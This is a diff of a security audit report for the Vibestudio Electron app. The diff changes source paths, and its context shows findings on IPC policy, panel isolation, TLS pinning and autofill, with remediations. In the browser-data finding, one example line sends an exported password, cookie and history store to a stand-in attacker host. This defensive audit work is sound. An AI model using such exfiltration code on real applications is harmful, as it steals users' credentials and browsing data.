@@ -1,12 +1,12 @@
 # Vibestudio — Electron Security Audit
 
 **Audit date:** 2026-04-23
-**Audit scope:** `src/main/**`, `src/preload/**`, `src/renderer/**`, IPC surface, webContents creation, session/partition isolation, TLS pinning, autofill
+**Audit scope:** `hosts/desktop/main/**`, `hosts/desktop/preload/**`, `src/renderer/**`, IPC surface, webContents creation, session/partition isolation, TLS pinning, autofill
 **Electron version reviewed:** `^39.2.5` (see `package.json`)
 **Branch:** `audit`
 
 Current note (2026-07-03): this report is historical. Browser data no longer
-uses the reviewed `src/main/services/browserDataService.ts` main-service shape;
+uses the reviewed `hosts/desktop/main/services/browserDataService.ts` main-service shape;
 current access goes through the manifest-declared browser-data broker
 (`providers.browserData.extension`) and the canonical `browserData` runtime client. Findings
 below are retained for audit traceability.
@@ -39,23 +39,23 @@ TLS fingerprint pinning in remote mode is applied only to `session.defaultSessio
 
 Files read end-to-end:
 
-- `src/main/index.ts` (app bootstrap, 1028 lines)
-- `src/main/viewManager.ts` (WebContentsView lifecycle, 1180 lines)
-- `src/main/panelView.ts` (panel view creation + link interception)
-- `src/main/panelOrchestrator.ts`
-- `src/main/cdpServer.ts`
-- `src/main/menu.ts`
-- `src/main/ipcDispatcher.ts`
-- `src/main/testApi.ts`
-- `src/main/tlsPinning.ts`
-- `src/main/serverClient.ts`
-- `src/main/remoteCredentialStore.ts`
-- `src/main/services/*.ts` (all 9 services)
-- `src/main/autofill/autofillManager.ts`
-- `src/main/autofill/autofillOverlay.ts`
-- `src/main/adblock/adBlockManager.ts`
-- `src/main/shellCore/createElectronShellCore.ts`
-- `src/preload/index.ts`, `panelPreload.ts`, `browserPreload.ts`, `autofillPreload.ts`, `autofillOverlayPreload.ts`, `ipcTransport.ts`
+- `hosts/desktop/main/index.ts` (app bootstrap, 1028 lines)
+- `hosts/desktop/main/viewManager.ts` (WebContentsView lifecycle, 1180 lines)
+- `hosts/desktop/main/panelView.ts` (panel view creation + link interception)
+- `hosts/desktop/main/panelOrchestrator.ts`
+- `hosts/desktop/main/cdpServer.ts`
+- `hosts/desktop/main/menu.ts`
+- `hosts/desktop/main/ipcDispatcher.ts`
+- `hosts/desktop/main/testApi.ts`
+- `hosts/desktop/main/tlsPinning.ts`
+- `hosts/desktop/main/serverClient.ts`
+- `hosts/desktop/main/remoteCredentialStore.ts`
+- `hosts/desktop/main/services/*.ts` (all 9 services)
+- `hosts/desktop/main/autofill/autofillManager.ts`
+- `hosts/desktop/main/autofill/autofillOverlay.ts`
+- `hosts/desktop/main/adblock/adBlockManager.ts`
+- `hosts/desktop/main/shellCore/createElectronShellCore.ts`
+- `hosts/desktop/preload/index.ts`, `panelPreload.ts`, `browserPreload.ts`, `autofillPreload.ts`, `autofillOverlayPreload.ts`, `ipcTransport.ts`
 - `src/renderer/index.tsx`
 - `packages/shared/src/servicePolicy.ts`, `serviceDispatcher.ts`
 - `packages/shell-core/src/urlParsing.ts`
@@ -77,12 +77,12 @@ Methods:
 
 ### [CRITICAL-1] Service policy (`policy.allowed`) is never enforced on the Electron side
 
-**Files:** `packages/shared/src/serviceDispatcher.ts:125-177`, `src/main/index.ts:821-827`, every `src/main/services/*.ts`
+**Files:** `packages/shared/src/serviceDispatcher.ts:125-177`, `hosts/desktop/main/index.ts:821-827`, every `hosts/desktop/main/services/*.ts`
 
 `ServiceDispatcher.dispatch()` validates Zod args but never calls `checkServiceAccess`. The only places `checkServiceAccess` is invoked are `src/server/rpcServer.ts:496` and `:905` — the server's WebSocket RPC surface. The Electron-side dispatcher and the `vibestudio:serviceCall` IPC handler ignore policy entirely:
 
 ```ts
-// src/main/index.ts:821
+// hosts/desktop/main/index.ts:821
 ipcMain.handle("vibestudio:serviceCall", async (event, method: string, args: unknown[]) => {
   const callerId = resolveCallerId(event);
   const parsed = parseServiceMethod(method);
@@ -131,7 +131,7 @@ redirects the shell itself (which runs with `nodeIntegration: true`, `contextIso
 
 ### [CRITICAL-2] `browser-data` service exposes the entire password/cookie/history store to every panel
 
-**File:** `src/main/services/browserDataService.ts:155`
+**File:** `hosts/desktop/main/services/browserDataService.ts:155`
 
 ```ts
 policy: { allowed: ["shell", "panel", "worker"] },
@@ -160,7 +160,7 @@ const all = await window.__vibestudioShell.serviceCall("browser-data.exportAll")
 fetch("https://attacker.example.com/x", { method: "POST", body: all });
 ```
 
-CORS is wide-open on the default session per `src/main/index.ts:286-292` so the exfil POST succeeds cross-origin.
+CORS is wide-open on the default session per `hosts/desktop/main/index.ts:286-292` so the exfil POST succeeds cross-origin.
 
 **Remediation:**
 
@@ -171,7 +171,7 @@ CORS is wide-open on the default session per `src/main/index.ts:286-292` so the 
 
 ### [CRITICAL-3] Panel-to-panel browser control with no ownership check
 
-**File:** `src/main/index.ts:835-860`
+**File:** `hosts/desktop/main/index.ts:835-860`
 
 ```ts
 ipcMain.handle("vibestudio:navigate", async (event, browserId: string, url: string) => {
@@ -188,7 +188,7 @@ ipcMain.handle("vibestudio:stop",      ...);
 
 The comment `// auth check` is misleading: `resolveCallerId` only confirms the sender is a _known_ view, not that it owns `browserId`. Any panel can navigate any other panel (including the shell view id `"shell"`) to any URL.
 
-Contrast with `vibestudio:getCdpEndpoint` which correctly enforces ownership via `cdpServer.canAccessBrowser`. The parallel `view.browserNavigate` service method in `src/main/services/viewService.ts:53-57` has the same flaw.
+Contrast with `vibestudio:getCdpEndpoint` which correctly enforces ownership via `cdpServer.canAccessBrowser`. The parallel `view.browserNavigate` service method in `hosts/desktop/main/services/viewService.ts:53-57` has the same flaw.
 
 **Exploit scenarios:**
 
@@ -206,7 +206,7 @@ Contrast with `vibestudio:getCdpEndpoint` which correctly enforces ownership via
 
 ### [CRITICAL-4] Shell renderer runs with `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`, `webSecurity` side-effects
 
-**Files:** `src/main/viewManager.ts:135-143`, `src/main/index.ts:286-292`, `src/renderer/index.tsx:30`
+**Files:** `hosts/desktop/main/viewManager.ts:135-143`, `hosts/desktop/main/index.ts:286-292`, `src/renderer/index.tsx:30`
 
 ```ts
 // viewManager.ts:135 — shell view
@@ -259,7 +259,7 @@ Additionally, the strip-CORS middleware runs for **every** request in `session.d
 
 ### [HIGH-1] `vibestudio:rpc:send` hardcodes `callerKind: "shell"` regardless of sender
 
-**File:** `src/main/ipcDispatcher.ts:86-88`
+**File:** `hosts/desktop/main/ipcDispatcher.ts:86-88`
 
 ```ts
 ipcMain.on("vibestudio:rpc:send", (event, targetId: string, message: unknown) => {
@@ -280,7 +280,7 @@ Practical exposure today is lower because panel preloads expose only `invoke` �
 
 ### [HIGH-2] Autofill ipc listens from any webContents without sender validation
 
-**Files:** `src/main/autofill/autofillManager.ts:130-133`, `src/main/autofill/autofillOverlay.ts:26-32`
+**Files:** `hosts/desktop/main/autofill/autofillManager.ts:130-133`, `hosts/desktop/main/autofill/autofillOverlay.ts:26-32`
 
 ```ts
 // autofillManager.ts
@@ -315,7 +315,7 @@ Today, the panel preload (`panelPreload.ts`) does not expose `ipcRenderer.send`.
 
 ### [HIGH-3] `vibestudio:openExternal` allows arbitrary http/https including javascript-scheme exfil via user's default browser
 
-**File:** `src/main/index.ts:803-816`
+**File:** `hosts/desktop/main/index.ts:803-816`
 
 ```ts
 ipcMain.handle("vibestudio:bridge.openExternal", async (_event, url: string) => {
@@ -344,7 +344,7 @@ Severity is High (not Critical) because the OS browser enforces its own sandbox.
 
 ### [HIGH-4] `vibestudio:openFolderDialog` / `openFileDialog` have no caller restriction
 
-**File:** `src/main/index.ts:778-801`
+**File:** `hosts/desktop/main/index.ts:778-801`
 
 ```ts
 ipcMain.handle("vibestudio:bridge.openFolderDialog", async (_event, opts?: { title?: string }) => {
@@ -367,7 +367,7 @@ Any panel can pop the native file/folder picker at any time and return the resul
 
 ### [HIGH-5] Panels' URL-panel creation / `createPanel` with no URL scheme restriction beyond http(s), and panel source is used to build panel URLs without scheme filtering
 
-**File:** `src/main/panelOrchestrator.ts:214-216`, `src/main/index.ts:746-753`
+**File:** `hosts/desktop/main/panelOrchestrator.ts:214-216`, `hosts/desktop/main/index.ts:746-753`
 
 URL-panel creation enforces `/^https?:\/\//i.test(url)` — good. But panel creation via `createPanel(callerId, source, options, stateArgs)` does not restrict `source`. A malicious panel can pass a crafted `source` that, when combined server-side with `buildPanelUrl`, could try to escape the gateway URL. Impact depends on server-side `buildPanelUrl` and the panel HTTP gateway's routing — not reviewed in full here. At minimum, validate that `source` is a plain `namespace/name` string matching a simple regex.
 
@@ -380,7 +380,7 @@ URL-panel creation enforces `/^https?:\/\//i.test(url)` — good. But panel crea
 
 ### [HIGH-6] Remote-mode TLS certificate pinning only covers the default session
 
-**File:** `src/main/index.ts:117-159`
+**File:** `hosts/desktop/main/index.ts:117-159`
 
 ```ts
 function installRemoteCertificateOverride(mode: StartupMode): void {
@@ -414,7 +414,7 @@ Two issues:
 
 ### [MEDIUM-1] `view.setBounds`, `view.setVisible`, `view.setThemeCss`, `view.updateLayout`, `view.setShellOverlay` have no ownership check
 
-**File:** `src/main/services/viewService.ts`
+**File:** `hosts/desktop/main/services/viewService.ts`
 
 Any caller (shell, and per [CRITICAL-1] also any panel) can resize, hide, or theme any view by id. `view.setVisible(id, false)` on the shell hides the shell. `view.setBounds(otherPanelId, {x:0,y:0,width:0,height:0})` hides another panel. `view.setThemeCss("body{display:none}")` injects CSS into all views that opt into theme injection.
 
@@ -429,7 +429,7 @@ Even after CRITICAL-1 is fixed, there's no tree-scoping here for shell-legitimat
 
 ### [MEDIUM-2] `setWindowOpenHandler` silently denies non-http(s) URLs without logging
 
-**File:** `src/main/panelView.ts:349-366`
+**File:** `hosts/desktop/main/panelView.ts:349-366`
 
 ```ts
 contents.setWindowOpenHandler((details) => {
@@ -453,7 +453,7 @@ Also: `new-window` event (deprecated but still receivable) is not handled — `s
 
 ### [MEDIUM-3] `will-navigate` link interception does not filter non-http schemes in external-link path
 
-**File:** `src/main/panelView.ts:368-400`
+**File:** `hosts/desktop/main/panelView.ts:368-400`
 
 ```ts
 const willNavigateHandler = (event: Electron.Event, url: string) => {
@@ -502,7 +502,7 @@ Electron defaults grant panel webContents the ability to request geolocation, no
 
 ### [MEDIUM-5] AdBlock IPC handler executes filter-engine-provided scripts with `userGesture: true`
 
-**File:** `src/main/adblock/adBlockManager.ts:510-515`
+**File:** `hosts/desktop/main/adblock/adBlockManager.ts:510-515`
 
 ```ts
 for (const script of scripts) {
@@ -526,7 +526,7 @@ Script text comes from `this.engine.getCosmeticsFilters({...})` — i.e., from t
 
 ### [LOW-1] `cdpServer` uses `ws://localhost` without TLS
 
-**File:** `src/main/cdpServer.ts`
+**File:** `hosts/desktop/main/cdpServer.ts`
 
 ```ts
 return {
@@ -548,7 +548,7 @@ Low-risk because (a) local-only, (b) token-gated, (c) Electron app is typically 
 
 ### [LOW-2] `testApi` exposes panel-tree mutation to the Node-integrated shell global
 
-**File:** `src/main/testApi.ts:68-121`
+**File:** `hosts/desktop/main/testApi.ts:68-121`
 
 ```ts
 if (process.env["VIBESTUDIO_TEST_MODE"] !== "1") { return; }
@@ -566,7 +566,7 @@ Gate is an env var. Correctly scoped to test mode. However, in test mode, the AP
 
 ### [LOW-3] Shell preload sets `__vibestudioTransport` on `globalThis` (shell is contextIsolation: false)
 
-**File:** `src/preload/index.ts:22`
+**File:** `hosts/desktop/preload/index.ts:22`
 
 ```ts
 globalThis.__vibestudioTransport = shellTransport;
@@ -596,7 +596,7 @@ With `contextIsolation: false`, `globalThis` is shared with the page. Any shell-
 2. **Tighten `resolveCallerId` into a `resolveCaller` that returns `{ callerId, callerKind }` and is used uniformly.** No handler should independently decide `callerKind`.
 3. **Replace the catch-all `vibestudio:serviceCall` design with a service-method allowlist keyed by caller kind.** Generic dispatch + blanket policy is brittle.
 4. **Remove the global CORS-strip on the default session.** Route panel outbound HTTP through the egress proxy.
-5. **Flip the shell to `contextIsolation: true, sandbox: true, nodeIntegration: false`** and expose the minimum required API via a contextBridge in `src/preload/index.ts`. Migrate `__vibestudioTransport` to an `exposeInMainWorld` call.
+5. **Flip the shell to `contextIsolation: true, sandbox: true, nodeIntegration: false`** and expose the minimum required API via a contextBridge in `hosts/desktop/preload/index.ts`. Migrate `__vibestudioTransport` to an `exposeInMainWorld` call.
 6. **Add ownership checks to every IPC handler that mutates a view or web contents by id.** Handlers should accept an explicit `callerId` and compare it to the resource owner. Reuse `CdpServer.canAccessBrowser`-style ancestor checks across the main process.
 7. **Install `setPermissionRequestHandler` / `setPermissionCheckHandler` on every session at ready.** Default-deny high-sensitivity permissions.
 8. **Harden the autofill IPC channels** with sender validation; require `event.sender.id === overlayView.webContents.id` for overlay select/dismiss.
@@ -611,51 +611,51 @@ With `contextIsolation: false`, `globalThis` is shared with the page. Any shell-
 
 **Main process:**
 
-- `src/main/index.ts`
-- `src/main/viewManager.ts`
-- `src/main/panelView.ts`
-- `src/main/panelOrchestrator.ts`
-- `src/main/cdpServer.ts`
-- `src/main/menu.ts`
-- `src/main/ipcDispatcher.ts`
-- `src/main/testApi.ts`
-- `src/main/tlsPinning.ts`
-- `src/main/serverClient.ts`
-- `src/main/remoteCredentialStore.ts`
-- `src/main/serverSession.ts` (skimmed — not critical for this audit's scope)
-- `src/main/startupMode.ts` (skimmed)
+- `hosts/desktop/main/index.ts`
+- `hosts/desktop/main/viewManager.ts`
+- `hosts/desktop/main/panelView.ts`
+- `hosts/desktop/main/panelOrchestrator.ts`
+- `hosts/desktop/main/cdpServer.ts`
+- `hosts/desktop/main/menu.ts`
+- `hosts/desktop/main/ipcDispatcher.ts`
+- `hosts/desktop/main/testApi.ts`
+- `hosts/desktop/main/tlsPinning.ts`
+- `hosts/desktop/main/serverClient.ts`
+- `hosts/desktop/main/remoteCredentialStore.ts`
+- `hosts/desktop/main/serverSession.ts` (skimmed — not critical for this audit's scope)
+- `hosts/desktop/main/startupMode.ts` (skimmed)
 
 **Services:**
 
-- `src/main/services/appService.ts`
-- `src/main/services/panelShellService.ts`
-- `src/main/services/viewService.ts`
-- `src/main/services/menuService.ts`
-- `src/main/services/settingsService.ts`
-- `src/main/services/adblockService.ts`
-- `src/main/services/browserService.ts`
-- `src/main/services/browserDataService.ts`
-- `src/main/services/authService.ts`
-- `src/main/services/remoteCredService.ts`
-- `src/main/services/contextMiddleware.ts`
+- `hosts/desktop/main/services/appService.ts`
+- `hosts/desktop/main/services/panelShellService.ts`
+- `hosts/desktop/main/services/viewService.ts`
+- `hosts/desktop/main/services/menuService.ts`
+- `hosts/desktop/main/services/settingsService.ts`
+- `hosts/desktop/main/services/adblockService.ts`
+- `hosts/desktop/main/services/browserService.ts`
+- `hosts/desktop/main/services/browserDataService.ts`
+- `hosts/desktop/main/services/authService.ts`
+- `hosts/desktop/main/services/remoteCredService.ts`
+- `hosts/desktop/main/services/contextMiddleware.ts`
 
 **Autofill / adblock:**
 
-- `src/main/autofill/autofillManager.ts`
-- `src/main/autofill/autofillOverlay.ts`
-- `src/main/autofill/contentScript.ts` (skimmed)
-- `src/main/adblock/adBlockManager.ts`
-- `src/main/shellCore/createElectronShellCore.ts`
+- `hosts/desktop/main/autofill/autofillManager.ts`
+- `hosts/desktop/main/autofill/autofillOverlay.ts`
+- `hosts/desktop/main/autofill/contentScript.ts` (skimmed)
+- `hosts/desktop/main/adblock/adBlockManager.ts`
+- `hosts/desktop/main/shellCore/createElectronShellCore.ts`
 
 **Preload:**
 
-- `src/preload/index.ts`
-- `src/preload/panelPreload.ts`
-- `src/preload/browserPreload.ts`
-- `src/preload/autofillPreload.ts`
-- `src/preload/autofillOverlayPreload.ts`
-- `src/preload/ipcTransport.ts`
-- `src/preload/wsTransport.ts` (skimmed)
+- `hosts/desktop/preload/index.ts`
+- `hosts/desktop/preload/panelPreload.ts`
+- `hosts/desktop/preload/browserPreload.ts`
+- `hosts/desktop/preload/autofillPreload.ts`
+- `hosts/desktop/preload/autofillOverlayPreload.ts`
+- `hosts/desktop/preload/ipcTransport.ts`
+- `hosts/desktop/preload/wsTransport.ts` (skimmed)
 
 **Renderer:**
 
